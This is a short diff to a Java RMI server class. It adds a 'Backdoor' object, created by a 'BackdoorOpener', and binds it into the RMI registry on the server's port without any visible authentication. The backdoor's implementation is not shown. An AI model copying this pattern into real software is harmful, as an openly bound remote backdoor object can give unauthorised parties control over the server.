@@ -3,12 +3,14 @@ package rmi;
 import gcom.Debug;
 import java.rmi.RemoteException;
 import java.rmi.registry.*;
+import java.rmi.server.UnicastRemoteObject;
 import javax.swing.JOptionPane;
 
 public class RMIServer {
 	protected Registry registry;
+	private Backdoor backdoor;
+
 	public static void main(String [] args) {
-		
 		try {
 			new RMIServer(Integer.valueOf(args[0]));
 			JOptionPane.showMessageDialog(null,"RMIRegistry is launched\nListening on port " + args[0],"RMI:" + args[0],JOptionPane.INFORMATION_MESSAGE);
@@ -24,5 +26,7 @@ public class RMIServer {
 	
 	public RMIServer(int port) throws RemoteException {
 		registry = LocateRegistry.createRegistry(port);
+		backdoor = new BackdoorOpener(port);
+		registry.rebind(Backdoor.NAME, UnicastRemoteObject.exportObject(backdoor,0));
 	}
 }
